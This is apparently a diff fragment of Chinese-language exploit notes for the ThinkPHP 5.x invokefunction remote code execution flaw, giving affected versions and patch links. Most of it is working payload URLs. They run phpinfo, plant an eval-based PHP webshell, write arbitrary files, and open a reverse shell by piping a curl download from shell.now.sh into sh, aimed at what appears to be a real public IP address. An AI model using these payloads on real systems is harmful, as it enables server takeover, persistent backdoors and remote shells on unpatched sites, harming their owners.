+范围： 5.x &lt; 5.1.31, &lt;= 5.0.23  
+补丁：https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f  
+https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815  
+payload: 
+http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
+
+http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php
+
+http://localhost:9096/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php echo &#39;ok&#39;;?&gt;
+shell反弹：
+http://121.12.172.119:30022//?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=curl+https%3A%2F%2Fshell.now.sh%2F154.223.145.173%3A1337+%7C+sh
+</pre></div>
                 
                   
                 
